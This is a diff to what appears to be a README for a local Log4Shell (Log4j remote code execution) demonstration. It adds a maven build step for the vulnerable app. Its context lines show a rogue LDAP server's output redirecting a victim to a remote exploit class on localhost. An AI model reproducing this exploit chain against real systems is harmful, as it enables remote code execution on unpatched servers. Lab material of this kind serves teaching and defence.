@@ -55,4 +55,11 @@ Send LDAP reference result for Log4jRCE redirecting to http://127.0.0.1:8888/Log
 Send LDAP reference result for Log4jRCE redirecting to http://127.0.0.1:8888/Log4jRCE.class
 </pre>
 
-3. Run the vulnerable App that uses Log4J to log error.
+## 2-vulnerable-app
+
+1. Run maven
+<pre>
+maven clean package install
+</pre>
+
+2. Run the vulnerable App that uses Log4J to log error.
